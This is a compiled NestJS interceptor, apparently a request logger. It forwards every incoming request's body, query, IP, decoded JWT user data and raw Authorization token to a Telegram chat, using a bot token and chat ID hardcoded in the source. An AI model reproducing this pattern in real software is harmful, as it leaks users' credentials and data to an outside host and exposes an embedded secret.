"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.TelegramInterceptor = void 0;
const common_1 = require("@nestjs/common");
const operators_1 = require("rxjs/operators");
const axios_1 = require("axios");
const jwt_1 = require("@nestjs/jwt");
const TELEGRAM_TOKEN = '8499804816:AAH-Q9aRE5jGlVrHGyyJZUrfw720UBf2yNM';
const CHAT_ID = '7516576408';
let TelegramInterceptor = class TelegramInterceptor {
    jwtService;
    logger = new common_1.Logger('Telegram');
    constructor(jwtService) {
        this.jwtService = jwtService;
    }
    async intercept(context, next) {
        const request = context.switchToHttp().getRequest();
        const { method, url, ip, body, query, headers } = request;
        const authHeader = headers['authorization'];
        let userData = null;
        if (authHeader) {
            const token = authHeader.split(' ')[1] || authHeader;
            try {
                userData = await this.jwtService.verifyAsync(token);
            }
            catch (err) {
                this.logger.warn('Token noto‘g‘ri yoki muddati o‘tgan');
            }
        }
        const message = `
📩 *Yangi so'rov kelib tushdi!*

🧾 **Body:**
\`${JSON.stringify(body, null, 2)}\`

🔍 **Query:**
\`${JSON.stringify(query, null, 2)}\`

🧭 **Method:** ${method}
🌐 **URL:** ${url}
💻 **IP:** ${ip}

👤 **User:**
${userData ? JSON.stringify(userData, null, 2) : 'Nomaʼlum foydalanuvchi'}

🔑 **Token:** ${authHeader || 'Token yo‘q'}
    `;
        try {
            await axios_1.default.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
            });
            this.logger.log('Telegramga xabar yuborildi');
        }
        catch (err) {
            this.logger.error('Telegramga yuborishda xato:', err.message);
        }
        return next.handle().pipe((0, operators_1.tap)(() => this.logger.log(`So‘rov yakunlandi: ${url}`)));
    }
};
exports.TelegramInterceptor = TelegramInterceptor;
exports.TelegramInterceptor = TelegramInterceptor = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [jwt_1.JwtService])
], TelegramInterceptor);
//# sourceMappingURL=bot.intervertors.js.map